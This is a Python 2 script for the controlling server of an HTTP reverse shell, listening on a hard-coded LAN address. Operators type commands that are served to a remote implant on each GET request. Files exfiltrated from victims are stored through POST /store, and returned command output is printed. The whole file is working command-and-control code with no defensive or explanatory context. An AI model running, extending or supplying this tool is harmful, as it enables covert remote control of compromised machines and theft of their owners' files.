import BaseHTTPServer
import os
import cgi

HOST = '192.168.1.18'
PORT = 8080

class ShutdownException(Exception):
    pass

class MyHandler(BaseHTTPServer.BaseHTTPRequestHandler):
    def do_GET(self):
        cmd = raw_input('> ')
        self.send_response(200)
        self.send_header('Content-type', 'text/html')
        self.end_headers()
        self.wfile.write(cmd)

        if cmd in ('exit', 'shutdown'):
            raise ShutdownException('Shut it down!')

    def do_POST(self):
        if self.path == '/store':
            try:
                ctype, _ = cgi.parse_header(self.headers.getheader('content-type'))
                if ctype == 'multipart/form-data':
                    fs = cgi.FieldStorage(fp=self.rfile,
                                          headers=self.headers,
                                          environ={'REQUEST_METHOD': 'POST'})
                else:
                    print '[-] Got an unexpected POST request'
                    self.send_response(500)
                    self.end_headers()
                    return

                for k in fs.keys():
                    fs_up = fs[k]
                    filename = os.path.basename(k)
                    if not os.path.exists(filename):
                        with open(filename, 'wb') as f:
                            f.write(fs_up.file.read())
                    else:
                        print '[!] File with same name ({filename}) already exists'.format(filename=filename)
                self.send_response(200)
                self.end_headers()
            except Exception as e:
                print e
        else:
            self.send_response(200)
            self.end_headers()
            length = int(self.headers['Content-Length'])
            data = self.rfile.read(length)
            print data

if __name__ == '__main__':
    server_class = BaseHTTPServer.HTTPServer
    httpd = server_class((HOST, PORT), MyHandler)

    try:
        print '[!] Server is listening on {host}:{port}'.format(host=HOST, port=PORT)
        httpd.serve_forever()
    except (ShutdownException, KeyboardInterrupt):
        print '[!] Server is terminated'
